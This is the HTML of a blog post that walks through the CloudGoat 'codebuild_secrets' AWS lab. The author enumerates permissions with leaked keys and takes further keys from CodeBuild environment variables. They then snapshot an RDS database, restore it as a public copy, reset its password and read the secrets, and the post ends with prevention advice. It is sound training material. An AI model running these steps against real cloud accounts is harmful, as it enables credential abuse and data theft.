<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>codebuild_secrets | JellyParks</title><meta name=keywords content="aws,cloud,cloudgoat,walkthrough,ctf"><meta name=description content="Cloud Goat codebuild secrets scenario walkthrough"><meta name=author content="Travis"><link rel=canonical href=https://jellyparks.com/cloudgoat/codebuild-secrets/><link crossorigin=anonymous href=/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://jellyparks.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="codebuild_secrets"><meta property="og:description" content="Cloud Goat codebuild secrets scenario walkthrough"><meta property="og:type" content="article"><meta property="og:url" content="https://jellyparks.com/cloudgoat/codebuild-secrets/"><meta property="og:image" content="https://jellyparks.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="cloudgoat"><meta property="article:published_time" content="2018-11-28T00:00:00+00:00"><meta property="article:modified_time" content="2018-11-28T00:00:00+00:00"><meta property="og:site_name" content="JellyParks"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://jellyparks.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="codebuild_secrets"><meta name=twitter:description content="Cloud Goat codebuild secrets scenario walkthrough"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Cloudgoats","item":"https://jellyparks.com/cloudgoat/"},{"@type":"ListItem","position":3,"name":"codebuild_secrets","item":"https://jellyparks.com/cloudgoat/codebuild-secrets/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"codebuild_secrets","name":"codebuild_secrets","description":"Cloud Goat codebuild secrets scenario walkthrough","keywords":["aws","cloud","cloudgoat","walkthrough","ctf"],"articleBody":" According to the official documentation for this scenario (here) the overall goal is “a pair of secret strings that are stored in a secure RDS database.”\nOnce the scenario creation process completes we are presented with a set of access keys for the user account ‘solo’.\n Who are we? First lets make sure the credentials we have obtained are valid. We can do this with the following command:\naws --profile solo sts get-caller-identity we get the following successful response:\n What can we do? Instead of heading to Pacu and using its handy enumeration lets do something that is a bit lighter on the logs and just poke around a bit. Perhaps we have access to make s3 calls, lets run s3 ls and see what happens.\nInteresting, it does seem like we can see a bucket in s3. Perhaps we can dig deeper and this bucket has something useful in it. After all, judging by its name it probably has some sort of logs and probably other things and stuff in it. We can do this by running:\naws --profile solo s3 ls logaboutlogsthingsandstuff34343434 Unfortunatly it looks like it errors out with a permission denied error. Lets continue on our path of manual enumeration. This time we will branch over into ec2’s. Why ec2’s, and why did we try s3 first? No real reason, other than to hit services that are fairly common, and that a vast majority of identities have access to.\nTo enumerate the ec2’s we will use the describe call:\naws --profile solo ec2 describe-instances |jq '.Reservations[].Instances[] | {InstanceId,PublicDnsName,PublicIpAddress,SubnetId,SecurityGroups,IamInstanceProfile}' This produces the output below, showing us an active ec2 with a public ip address.\nInteresting, lets see if we can dig a bit deeper into the security group that is attached with the name: cg-ec2-ssh-cgidg25jfhzv9a. Chances are that it only allows ssh since its in the name, but who knows a lazy admin could have added other ports to the security group for quick access. We can get the security group details with:\naws --profile solo ec2 describe-security-groups --group-ids sg-09f30e4f217cd294a --region us-east-1 | jq '.SecurityGroups[] | .IpPermissions[]' As expected, the only port allowed with this security gorup is TCP/22.\n Additional Service Enumeration We now know we cannot see anything useful in S3 and there is not much to do with the Ec2. We could pivot and attempt to log into the SSH. That however, is beyond the scope of this assessment. The great thing about AWS is there are several other services we can enumerate. These keys we have were created for a reason. Up to this point we really have not discovered that reason. MORE enumeration!\nFor this next part we will switch over to Pacu and let it handle some of the additional enumeration for us. There are several services that are not included in Pacu that these keys could be used for, but sometimes its nice to let tools live up to there purpose. Looking at the picture below we can see Pacu has several options within the ENUM category:\nSome of these we have lightly touched. Perhaps we have rights to Lambda? Lets see what happens if we try the lambda__enum.\nrun lambda__enum --region us-east-1 *Note: In the command above I specify the us-east-1 region, this is because I know us-east-1 is only region in my account where workloads are being placed. If you do not know where the workloads exist, you will have to enumerate each region.\nOnce again, brick wall. We are missing the required permissions. All of the other service enumerations return the same results except for one, codebuild.\n Codebuild Enum run codebuild__enum Success! The codebuild enumeration found 1 project and 2 environment variables. Neat! In Pacu we can run the data command to see the information it pulled from our enumeration efforts. Below is a snippet of the data:\nPacu (code_build:solo)  data CodeBuild: { \"EnvironmentVariables\": [ { \"name\": \"calrissian-aws-access-key\", \"value\": \"AKIA5X73KRQWNCPL\", \"type\": \"PLAINTEXT\" }, { \"name\": \"calrissian-aws-secret-key\", \"value\": \"nG3Wtl86vXcDp90JUx9smFriCoFk0\", \"type\": \"PLAINTEXT\" } ], \"Projects\": [ { \"name\": \"cg-codebuild-cgidg25jfhzv9a\", \"arn\": \"arn:aws:codebuild:us-east-1:1111111111111:project/cg-codebuild-cgidg25jfhzv9a\", \"source\": { \"type\": \"NO_SOURCE\", \"buildspec\": \"version: 0.2\\n\\nphases:\\n pre_build:\\n commands:\\n - echo \\\"This is CloudGoat's simpliest buildspec file ever (maybe)\\\"\" }, \"artifacts\": { \"type\": \"NO_ARTIFACTS\" }, \"cache\": { \"type\": \"NO_CACHE\" }, \"environment\": { \"type\": \"LINUX_CONTAINER\", \"image\": \"aws/codebuild/standard:1.0\", \"computeType\": \"BUILD_GENERAL1_SMALL\", \"environmentVariables\": [ { \"name\": \"calrissian-aws-access-key\", \"value\": \"AKIA5X73KRQWNCPL\", \"type\": \"PLAINTEXT\" }, { \"name\": \"calrissian-aws-secret-key\", \"value\": \"nG3Wtl86vXcDp90JUx9smFriCoFk0\", \"type\": \"PLAINTEXT\" } ] }, Looking at the output we have a container image, and in the build it sets a couple of environment variables:\n{ \"name\": \"calrissian-aws-access-key\", \"value\": \"AKIA5X73KRQWNCPL\", \"type\": \"PLAINTEXT\" }, { \"name\": \"calrissian-aws-secret-key\", \"value\": \"nG3Wtl86vXcDp90JUx9smFriCoFk0\", \"type\": \"PLAINTEXT\" } Awesome, we have another set of keys. These keys seem to be for a user name Calrissian. It seems like this organization has a fondness for Star Trek.\n Codebuild Manual Enumeration Before we dig into the Calrissian user, lets take a step back and re run this codebuild enumeration using the aws cli. We start buy querying aws for a list of every project.\naws --profile solo codebuild list-projects This produces the name of the project cg-codebuild-cgidg25jfhzv9a\nNow that we have the project name we can query aws for the details about the project with:\naws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a This dumps all of the details about the project. Cleaning the request up a little bit with jq:\naws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a |jq '.projects[].environment.environmentVariables[]' We get the clean output below.\n Calrissian It’s time to find out what permissions we have as the Calrissian user. First we will make sure the credentials work by running get-caller-identity.\naws --profile cal sts get-caller-identity We have confirmed the credentials are still valid. Now we need to start the enumeration process over again. We can start just like last time and see if we have access to s3.\naws --profile cal s3 ls Unfortunatly, just like the solo user we do not have access to s3. In fact judging by this error we have even less permission to s3 now than we did with solo. Solo had a policy action to describe-buckets, and we do not.\nAttempting to describe instances returns a similar error that we are unauthorized.\nAfter lots of additional enumeration (and remembering the goal is to access an RDS database) we finally come across an area of aws where we have permissions, RDS. We can determine this and learn details about the environment with the following command:\naws --profile cal rds describe-db-instances |jq '.DBInstances[]' All kinds of useful information is returned as we can see in the screenshot below:\nFrom the details in the screenshot we can determine the type of database, its DNS name, port its listening on, the security group it is a part of, and subnet information.\n Instance Identifer: cg-rds-instance-cgidg25jfhzv9a Engine: postgres Endpoint: cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com Port: 5432 Security Group: sg-096bb9f39aaa9334d Subnets: subnet-029ccc8e6ee777916, subnet-054c36278fc5a0b5c  Lets see if we can connect. We still do not have a password, but if we can connect, we can try and work around that. We know the database is a postgres server so we can use the following command to attempt a connection:\npsql -h cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p 5432 That does not seem to work, it just hangs for a couple of minutes, the psql app is probably trying to connect/reconnect before timing out. Lets confirm that the RDS instance is listening on 5432 and that we have access to it. We can do this with:\nnmap -Pn -p5432 cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com Looking at the nmap output, it appears that the RDS instance is not configured in a way that we have access to it.\n5432/tcp filtered postgresql At this point we know we have access to make RDS calls. We do not know what our limits are but perhaps we have additional rights. There are a few different paths we could take at this point:\n We can attempt to take our DB public with modify-db-subnet-group, and then attempt to modify the instance to set a password We can attempt to take a snapshot and then share the snapshot with an account we control We can attempt to snapshot the instance, and create a public version that we control  The issue with option 1 is that we have no idea what this might break. It could cause the entire app stack which leverages this DB to crash. As soon as that happens someone will start to dig into why did it crash and inevitably start asking questions about why the DB suddenly changed subnets. Option 2 is a valid and viable option, but in this scenario not necessary. We will move ahead with option 3. Back to enumeration! Lets see if we can gain some insight into the subnets, and security groups.\naws --profile cal rds describe-db-subnet-groups |jq Looking at the output from the command above we see all of the subnets that rds has access to. The two subnets associated with the instance we discovered earlier are a part of a group which has the description: CloudGoat cgidg25jfhzv9a Subnet Group. There does appear to be another subnet group called: cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a and has a description of CloudGoat cgidg25jfhzv9a Subnet Group ONLY for Testing with Public Subnets. Perhaps we could use this group to grant public access to an instance.\nNext we should see if there is a security group that would allow us to access the RDS instance. We can use the following command:\naws --profile cal ec2 describe-security-groups |jq The output from the command above reveals that the group sg-096bb9f39aaa9334d is a security group that allows access to the postgres port. Screenshot is below.\n Our own DB At this point we know we have a subnet, and a security group that we can apply to an RDS instance that should grant us the access we are looking for. The next thing we should do is see if we have rights to create a snapshot.\naws --profile cal rds create-db-snapshot --db-instance-identifier cg-rds-instance-cgidg25jfhzv9a --db-snapshot-identifier yogi-db-snap After running the command above we get an output that shows us that the command was successful, and that the current status is creating.\nBefore we can restore our snapshot to an RDS instance that we control the snapshot needs to be completed. We can check that by using the describe-db-snapshots command.\naws --profile cal rds describe-db-snapshots --db-snapshot-identifier yogi-db-snap After executing that command we get the output below, which tells us that we do not have permissions to check on the status of our db.\nHopefully, this is not a sign of things to come. Since we do not know if the snapshot is complete the only option we have is to wait until we think its done. After that we can attempt to restore it, and hopefully we will have enough permissions to do so.\nTo restore the database we need the following bits information that we discovered earlier:\n RDS Public Subnet Name: cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a VPC Security group that grants us access: sg-096bb9f39aaa9334d  We can use the information above and build the command below to start the build process:\naws --profile cal rds restore-db-instance-from-db-snapshot --db-instance-identifier yogidbinstance --db-snapshot-identifier yogi-db-snap --db-subnet-group-name cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a --publicly-accessible --vpc-security-group-ids sg-096bb9f39aaa9334d The output should return something similar to the image below with the ‘DBInstanceStatus’ of creating\nAfter a couple of minutes we can check the status of our creation with:\naws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance |jq '.DBInstances[] .DBInstanceStatus' Once the output shows that the db is ‘available’ we can attemp to connect. The connection address was given to us when we ran the restore command above, but if you lost that we can get the information with the following command:\naws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance |jq '.DBInstances[] .Endpoint' We can use psql to attempt a connection to the db host:\npsql -h yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p 5432 Great, we have a connetion! Now we need to connect with the default cgadmin and the admin password. However, before we do that we need to set the password to something we know. To do that we need to run the modify-db-instance command:\naws --profile cal rds modify-db-instance --db-instance-identifier yogidbinstance --master-user-password yogibear We will receive an output that shows:\n\"PendingModifiedValues\": { \"MasterUserPassword\": \"****\" }, Now lets try to connect to our RDS instance one more time.\npsql postgresql://cgadmin@yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com:5432/postgres We can list the databases with \\l\nLooking at the output, the securedb looks interesting. Lets connect to it, list the tables, and print it all to the screen.\n\\c securedb \\dt SELECT * FROM sensitive_information; Awesome! We succesfull gained access to the secret information within the RDS database.\n Alternative Path There is another way to gain access to the secrets held in the database. I have not worked through that path. Once I do I will update this document.\n Prevention Where did the owner of this account go wrong? There are a few places where this attack could have be stopped. Lets dive into them.\n Our initial access was through the solo user. Does that user need static keys? If they could be switched to temorary ephemeral keys it would greatly reduce the liklihood that if an attacker found the keys that they would still be valid. Does solo need access to codebuild? Chances are they do, the permissions seemed to be fairly tightly scoped around that service. But if they do not, removing those capabilities would be good. Within the codebuild project we came across keys for the calrissian user. Those keys should not exist within this project. Assuming the keys were placed there to grant the Linux container associated with this project access to RDS or other portions of AWS, there are better ways to do this. Assigning a role to the node where the container lives would be the best option. If the container does not live within aws, using a secrets manager is the next best thing. The calrissian user seemed to have a mismash of permissions in RDS. If these permission are not all required they should be removed. Specifically the modify-db-instance, and create-db-snapshot permissions.  By fixing one of these things or all of them, it would have effected our ability to access the secret data within the database.\nFrom a logging and alerting point of view, we probably made several commands that were not ’normal’ for the solo and calrissian users to make. By alerting on this odd activity the response team could have detected us and shut the attack down. Additionally if there would have been a configuration management solution to monitor for RDS instances being made public and preventing it. It would have made our attack much more complicated.\n","wordCount":"2413","inLanguage":"en","datePublished":"2018-11-28T00:00:00Z","dateModified":"2018-11-28T00:00:00Z","author":{"@type":"Person","name":"Travis"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://jellyparks.com/cloudgoat/codebuild-secrets/"},"publisher":{"@type":"Organization","name":"JellyParks","logo":{"@type":"ImageObject","url":"https://jellyparks.com/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://jellyparks.com accesskey=h title="Home (Alt + H)">Home</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://jellyparks.com/archives title=Archive><span>Archive</span></a></li><li><a href=https://jellyparks.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://jellyparks.com/categories/ title=categories><span>categories</span></a></li><li><a href=https://jellyparks.com/tags/ title=tags><span>tags</span></a></li><li><a href=https://jellyparks.com/me/about/ title=me><span>me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://jellyparks.com>Home</a>&nbsp;»&nbsp;<a href=https://jellyparks.com/cloudgoat/>Cloudgoats</a></div><h1 class=post-title>codebuild_secrets</h1><div class=post-meta><span title="2018-11-28 00:00:00 +0000 UTC">November 28, 2018</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;Travis&nbsp;|&nbsp;<a href=https://github.com/yogisec/yogisec.github.io/blob/main/content/cloudgoat/codebuild-secrets/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><hr><p>According to the official documentation for this scenario (<a href=https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/codebuild_secrets>here</a>) the overall goal is &ldquo;a pair of secret strings that are stored in a secure RDS database.&rdquo;</p><p>Once the scenario creation process completes we are presented with a set of access keys for the user account &lsquo;solo&rsquo;.</p><hr><h3 id=who-are-we>Who are we?<a hidden class=anchor aria-hidden=true href=#who-are-we>#</a></h3><p>First lets make sure the credentials we have obtained are valid. We can do this with the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solo sts get-caller-identity
</span></span></code></pre></div><p>we get the following successful response:</p><p><img loading=lazy src=images/initial-user.png alt="Initial User" title=img-fluid></p><hr><h3 id=what-can-we-do>What can we do?<a hidden class=anchor aria-hidden=true href=#what-can-we-do>#</a></h3><p>Instead of heading to Pacu and using its handy enumeration lets do something that is a bit lighter on the logs and just poke around a bit. Perhaps we have access to make s3 calls, lets run <code>s3 ls</code> and see what happens.</p><p><img loading=lazy src=images/s3-ls.png alt=s3-ls title=img-fluid></p><p>Interesting, it does seem like we can see a bucket in s3. Perhaps we can dig deeper and this bucket has something useful in it. After all, judging by its name it probably has some sort of logs and probably other things and stuff in it. We can do this by running:</p><pre tabindex=0><code>aws --profile solo s3 ls logaboutlogsthingsandstuff34343434
</code></pre><p><img loading=lazy src=images/logsaboutstuff.png alt=logsaboutstuff title=img-fluid></p><p>Unfortunatly it looks like it errors out with a permission denied error. Lets continue on our path of manual enumeration. This time we will branch over into ec2&rsquo;s. Why ec2&rsquo;s, and why did we try s3 first? No real reason, other than to hit services that are fairly common, and that a vast majority of identities have access to.</p><p>To enumerate the ec2&rsquo;s we will use the describe call:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solo ec2 describe-instances <span class=p>|</span>jq <span class=s1>&#39;.Reservations[].Instances[] | {InstanceId,PublicDnsName,PublicIpAddress,SubnetId,SecurityGroups,IamInstanceProfile}&#39;</span>
</span></span></code></pre></div><p>This produces the output below, showing us an active ec2 with a public ip address.</p><p><img loading=lazy src=images/ec2-enum.png alt=ec2_enum title=img-fluid></p><p>Interesting, lets see if we can dig a bit deeper into the security group that is attached with the name: <code>cg-ec2-ssh-cgidg25jfhzv9a</code>. Chances are that it only allows ssh since its in the name, but who knows a lazy admin could have added other ports to the security group for quick access. We can get the security group details with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solo ec2 describe-security-groups --group-ids sg-09f30e4f217cd294a --region us-east-1 <span class=p>|</span> jq <span class=s1>&#39;.SecurityGroups[] | .IpPermissions[]&#39;</span>
</span></span></code></pre></div><p>As expected, the only port allowed with this security gorup is <code>TCP/22</code>.</p><p><img loading=lazy src=images/ec2-sec.png alt=ec2_sec title=img-fluid></p><hr><h3 id=additional-service-enumeration>Additional Service Enumeration<a hidden class=anchor aria-hidden=true href=#additional-service-enumeration>#</a></h3><p>We now know we cannot see anything useful in S3 and there is not much to do with the Ec2. We could pivot and attempt to log into the SSH. That however, is beyond the scope of this assessment. The great thing about AWS is there are several other services we can enumerate. These keys we have were created for a reason. Up to this point we really have not discovered that reason. MORE enumeration!</p><p>For this next part we will switch over to Pacu and let it handle some of the additional enumeration for us. There are several services that are not included in Pacu that these keys could be used for, but sometimes its nice to let tools live up to there purpose. Looking at the picture below we can see Pacu has several options within the ENUM category:</p><p><img loading=lazy src=images/pacu-enum-options.png alt=pacu_enum_options title=img-fluid></p><p>Some of these we have lightly touched. Perhaps we have rights to Lambda? Lets see what happens if we try the <code>lambda__enum</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>run lambda__enum --region us-east-1
</span></span></code></pre></div><p>*<em>Note: In the command above I specify the us-east-1 region, this is because I know us-east-1 is only region in my account where workloads are being placed. If you do not know where the workloads exist, you will have to enumerate each region.</em></p><p><img loading=lazy src=images/lambda-enum.png alt=lambda_enum title=img-fluid></p><p>Once again, brick wall. We are missing the required permissions. All of the other service enumerations return the same results except for one, codebuild.</p><hr><h3 id=codebuild-enum>Codebuild Enum<a hidden class=anchor aria-hidden=true href=#codebuild-enum>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>run codebuild__enum
</span></span></code></pre></div><p><img loading=lazy src=images/codebuild-enum.png alt=codebuild_enum title=img-fluid></p><p>Success! The codebuild enumeration found 1 project and 2 environment variables. Neat! In Pacu we can run the <code>data</code> command to see the information it pulled from our enumeration efforts. Below is a snippet of the data:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=err>Pacu</span> <span class=err>(code_build:solo)</span> <span class=err>&gt;</span> <span class=err>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>CodeBuild:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=nt>&#34;EnvironmentVariables&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;calrissian-aws-access-key&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;AKIA5X73KRQWNCPL&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;PLAINTEXT&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;calrissian-aws-secret-key&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;nG3Wtl86vXcDp90JUx9smFriCoFk0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;PLAINTEXT&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=p>],</span>
</span></span><span class=line><span class=cl> <span class=nt>&#34;Projects&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;cg-codebuild-cgidg25jfhzv9a&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;arn&#34;</span><span class=p>:</span> <span class=s2>&#34;arn:aws:codebuild:us-east-1:1111111111111:project/cg-codebuild-cgidg25jfhzv9a&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;source&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;NO_SOURCE&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;buildspec&#34;</span><span class=p>:</span> <span class=s2>&#34;version: 0.2\n\nphases:\n pre_build:\n commands:\n - echo \&#34;This is CloudGoat&#39;s simpliest buildspec file ever (maybe)\&#34;&#34;</span>
</span></span><span class=line><span class=cl>   <span class=p>},</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;artifacts&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;NO_ARTIFACTS&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;cache&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;NO_CACHE&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;environment&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;LINUX_CONTAINER&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;image&#34;</span><span class=p>:</span> <span class=s2>&#34;aws/codebuild/standard:1.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;computeType&#34;</span><span class=p>:</span> <span class=s2>&#34;BUILD_GENERAL1_SMALL&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;environmentVariables&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>   <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;calrissian-aws-access-key&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;AKIA5X73KRQWNCPL&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;PLAINTEXT&#34;</span>
</span></span><span class=line><span class=cl>   <span class=p>},</span>
</span></span><span class=line><span class=cl>   <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;calrissian-aws-secret-key&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;nG3Wtl86vXcDp90JUx9smFriCoFk0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;PLAINTEXT&#34;</span>
</span></span><span class=line><span class=cl>   <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=p>},</span>
</span></span></code></pre></div><p>Looking at the output we have a container image, and in the build it sets a couple of environment variables:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;calrissian-aws-access-key&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;AKIA5X73KRQWNCPL&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;PLAINTEXT&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;calrissian-aws-secret-key&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;nG3Wtl86vXcDp90JUx9smFriCoFk0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;PLAINTEXT&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
